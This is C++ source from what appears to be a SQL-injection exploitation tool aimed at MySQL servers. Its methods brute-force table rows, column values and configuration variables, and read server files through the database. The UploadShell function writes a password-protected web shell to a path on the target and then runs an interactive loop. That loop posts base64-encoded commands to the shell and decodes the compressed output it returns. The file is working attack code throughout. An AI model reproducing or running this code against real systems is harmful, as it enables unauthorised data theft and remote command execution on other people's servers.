TCHAR *Framework::GetRowData(TCHAR *dbname, TCHAR *tablename, TCHAR *columnname, long row) const
{
    HistoryRow *r = this->history.GetRow(this->host_, dbname, tablename, columnname, row);
    if (this->always_lookup_ && r)
        return r->data;

    LOG(2, _T("[*] Bruteforcing row data for row id %d and column %s in table %s in database %s"), row, columnname, tablename, dbname);

    TCHAR *data = this->mysql->GetRowData(dbname, tablename, columnname, row);

    r = this->history.AddRow(this->host_, dbname, tablename, columnname, data, row);
    delete[] data;

    return r ? r->data : 0;
}

TCHAR *Framework::GetCustomData(TCHAR *dbname, TCHAR *tablename, TCHAR *columnname, TCHAR *target, TCHAR *criteria) const
{
    //HistoryRow *r = this->history.GetRow()

    LOG(2, _T("[*] Bruteforcing data for column '%s' in table '%s' in database '%s'"), columnname, tablename, dbname);

    TCHAR *data = this->mysql->GetCustomData(dbname, tablename, columnname, target, criteria);

    HistoryRow *r = this->history.AddRow(this->host_, dbname, tablename, columnname, data, 0);
    delete[] data;

    return r ? r->data : 0;
}

TCHAR *Framework::LoadFile(TCHAR *filepath) const
{
    HistoryFile *file = this->history.GetFile(this->host_, filepath);
    if (this->always_lookup_ && file)
        return file->contents;

    LOG(2, _T("[*] Getting file %s"), filepath);

    TCHAR *contents = this->mysql->LoadFile(filepath);

    file = this->history.AddFile(this->host_, filepath, contents);
    delete[] contents;

    return file ? file->contents : 0;
}

TCHAR *Framework::GetConfigValue(TCHAR *variable) const
{
    HistoryVariable *var = this->history.GetConfigValue(this->host_, variable);
    if (this->always_lookup_ && var)
        return var->value;

    LOG(2, _T("[*] Bruteforcing config value for variable '%s'"), variable);

    TCHAR *value = this->mysql->GetConfigValue(variable);

    var = this->history.AddConfigValue(this->host_, variable, value);
    delete[] value;

    return var ? var->value : 0;
}

TCHAR *Framework::ExecuteFunction(TCHAR *function) const
{
    LOG(2, _T("[*] Getting result for function '%s'"), function);

    TCHAR *result = this->mysql->ExecuteFunction(function);

    return result;
}

void Framework::UploadShell(TCHAR *path)
{
    LOG(2, _T("[*] Trying to upload shell into '%s'"), path);

    Strings strings;
    TCHAR secret_key = 0x01;
    char *shell_password_key = "a", *command_key = "b";
    char shell_password_value[256] = { 0 };
    Logger::GetInstance().Log(false, _T("[+] Create password for the shell (max. %d chars): "), sizeof(shell_password_value));
    gets_s(shell_password_value, sizeof(shell_password_value));
    char *shell_password_value_hex = strings.GetSHA512HEX(reinterpret_cast<unsigned char*>(shell_password_value), strlen(shell_password_value));

    TCHAR* shell = strings.GenerateShell(shell_password_key, shell_password_value_hex, command_key);
    
    this->mysql->SaveFile(path, shell, _tcslen(shell), true);
    delete[] shell;

    TCHAR *data = this->LoadFile(path);
    if (!data || !_tcslen(data))
    {
        LOG(0, _T("[*] Failed to upload shell to '%s'"), path);
        return;
    }

    // Ask the user for the relative path to the shell (we can't figure that out)
    TCHAR relativeshellurl[4096] = { 0 };
    while (true)
    {
        TCHAR *question = _T("[*] Input relative path to the shell (start with /): ");
        
        Logger::GetInstance().Log(false, _T("%s"), question);
        _fgetts(relativeshellurl, sizeof(relativeshellurl), stdin);
        relativeshellurl[_tcslen(relativeshellurl) - 1] = '\0'; // Remove '\n' from the buffer
        GetFileHandle() << relativeshellurl;
        GetFileHandle() << _T("\r\n");

        Logger::GetInstance().Log(false, _T("[*] Shell URL: http://%s:%d%s OK (Y/N)? "), this->host_, this->port_, relativeshellurl);

        TCHAR choice[5];
        _fgetts(choice, sizeof(choice), stdin);
        if (choice[0] == _T('Y') || choice[0] == _T('y'))
            break;
    }

    size_t buflen = 4096;
    TCHAR buffer[4096] = { 0 };

    while (true)
    {
        Logger::GetInstance().Log(false, _T(">"));
        memset(buffer, 0, buflen * sizeof(TCHAR));
        _fgetts(buffer, buflen, stdin);
        GetFileHandle() << buffer;
        GetFileHandle() << _T("\r\n");

        // Check if the first command is 'quit' or 'exit'
        TCHAR *quit_command = _tcsstr(buffer, _T("quit"));
        TCHAR *exit_command = _tcsstr(buffer, _T("exit"));
        if (((quit_command - buffer) == 0) || (exit_command - buffer) == 0)
        {
            LOG(0, _T("[*] Exiting..."));
            break;
        }

        char *command_value_base64 = strings.WideCharToEncodedBase64String(buffer);
        size_t bufsize = 4096;

        char *postdata = new char[bufsize];
        memset(postdata, 0, bufsize * sizeof(char));
        sprintf_s(postdata, bufsize, "%s=%s&%s=%s", shell_password_key, shell_password_value_hex, command_key, command_value_base64);
        delete[] command_value_base64;

        data = http->PostData(this->host_, this->port_, relativeshellurl, postdata);
        delete[] postdata;

        if (!data)
        {
            delete[] data;
            LOG("[-] No data received.");
            continue;
        }

        TCHAR *start_data = _tcschr(data, secret_key);
        if (!start_data)
        {
            delete[] data;
            LOG("[-] Start identifier of response data not found");
            continue;
        }
        ++start_data;
        TCHAR *end_data = _tcschr(start_data, secret_key);
        if (!end_data)
        {
            delete[] data;
            LOG("[-] End identifier of response data not found");
            continue;
        }
        *end_data = '\0';

        TCHAR *codepage_end = _tcschr(start_data, '.');
        *codepage_end = '\0';
        TCHAR *codepage_start = start_data;
        codepage_end++;

        int data_codepage_num = _tstoi(codepage_start);

        char *deflated_data = strings.Base64StringToDecodedChar(codepage_end, &bufsize);
        unsigned char *raw_text = strings.Inflate(reinterpret_cast<unsigned char*>(deflated_data), bufsize, &bufsize);
        wchar_t *utf16_data_wchar = strings.ConvertCharStringToWideChar(data_codepage_num, reinterpret_cast<char*>(raw_text), bufsize, &bufsize);

        Logger::GetInstance().Log(false, _T("%s"), utf16_data_wchar ? utf16_data_wchar : _T(""));

        delete[] utf16_data_wchar;
        delete[] raw_text;
        delete[] deflated_data;
        delete[] data;
    }
    delete[] shell_password_value_hex;
}
